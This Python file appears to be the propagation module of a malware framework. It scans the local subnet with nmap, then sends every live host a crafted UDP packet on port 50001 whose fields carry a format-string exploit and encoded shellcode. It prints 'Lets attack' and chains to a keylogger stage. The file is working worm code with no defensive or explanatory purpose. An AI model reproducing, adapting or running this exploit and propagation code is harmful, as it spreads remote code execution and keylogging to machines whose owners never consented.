#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_network(interface):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    return network

def net_scan(network):
    try:
        print('Scanning Network')
        # Run nmap and pipe its output to awk
        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
        # output = subprocess.check_output(command, shell=True, text=True)
        output = subprocess.check_output(command, shell=True, universal_newlines=True)

        # Split the output by newlines to get a list of IPs
        ip_addresses = output.strip().split('\n')
        print('Done!', len(ip_addresses), 'Hosts are up')
        return ip_addresses
    except subprocess.CalledProcessError as e:
        return []


def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d

shellcode =  b""
shellcode += b"\xdb\xcc\xba\xd7\xb9\xf3\x10\xd9\x74\x24\xf4"
shellcode += b"\x5e\x31\xc9\xb1\x10\x83\xee\xfc\x31\x56\x13"
shellcode += b"\x03\x81\xaa\x11\xe5\x47\xc6\x8d\x9f\xc5\xbe"
shellcode += b"\x45\x8d\x8a\xb7\x71\xa5\x63\xbb\x15\x36\x13"
shellcode += b"\x14\x84\x5f\x8d\xe3\xab\xf2\xb9\xed\x2b\xf3"
shellcode += b"\x39\x7a\x43\x86\x5a\xea\xbb\x46\xb3\x93\xd4"
shellcode += b"\xe3\xaa\x11\x4e\x6a\x59\xb5\xfb\x17\xc5\x17"
shellcode += b"\x88\xaf\x71\x68\x27\x03\xf0\x89\x0a\x23"

def run():
    next_action = ""
    data = ""
    print("[+] Propagation module activated...")

    # try:
    interface = get_interface()
    network = get_network(interface)
    port = 50001  # Define the port to scan
    neighbors = net_scan(network)
    print('Lets attack')
    print('Brute all active Hosts on Port 50001')
    
    for ip in neighbors:
        print(f'IP: {ip}')
        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(p, (ip, port))
        s.close()
            
    # except Exception as e: 
    #     print(e)
    #     pass
        # exit()

    next_action = "keylogger"
    return data, next_action

if __name__ == '__main__':
    run()